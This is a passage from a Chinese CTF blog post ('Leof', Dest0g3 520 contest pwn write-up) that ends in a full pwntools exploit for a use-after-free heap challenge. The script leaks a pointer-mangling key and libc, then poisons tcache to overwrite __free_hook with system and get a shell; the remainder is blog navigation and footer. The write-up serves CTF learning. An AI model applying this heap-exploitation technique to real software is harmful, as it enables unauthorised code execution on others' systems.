index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Please tell me its content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Please tell me the index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Please tell me the index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x80</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">new(<span class="number">0x80</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">new(<span class="number">0x80</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">new(<span class="number">0x80</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">new(<span class="number">0x80</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">new(<span class="number">0x80</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">new(<span class="number">0x80</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">new(<span class="number">0x80</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">key = u64(io.recvuntil(<span class="string">&#x27;\x05&#x27;</span>)[<span class="number">2</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;key:&#x27;</span>, <span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">2</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;malloc_hook:&#x27;</span>,<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__malloc_hook&#x27;</span>, malloc_hook)</span><br><span class="line">libcbase = malloc_hook - libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">free_hook = libcbase + libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line">sys_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x80</span>, <span class="string">b&#x27;aaaa&#x27;</span>)  <span class="comment">#6 9</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(key ^ free_hook)</span><br><span class="line">edit(<span class="number">9</span>, payload)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x80</span>, <span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">new(<span class="number">0x80</span>, p64(sys_addr))</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+              <a href="/tags/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/" rel="tag"># Dest0g3-520迎新赛</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/06/14/IO-FILE-leak/" rel="prev" title="IO_FILE-leak">
+      <i class="fa fa-chevron-left"></i> IO_FILE-leak
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/06/17/%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/" rel="next" title="2022DASCTF X SU 三月春季挑战赛">
+      2022DASCTF X SU 三月春季挑战赛 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ez-aarch"><span class="nav-number">1.</span> <span class="nav-text">ez_aarch</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ez-pwn"><span class="nav-number">2.</span> <span class="nav-text">ez_pwn</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#dest-love"><span class="nav-number">3.</span> <span class="nav-text">dest_love</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ezuaf"><span class="nav-number">4.</span> <span class="nav-text">ezuaf</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Leof"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Leof</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Leof</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
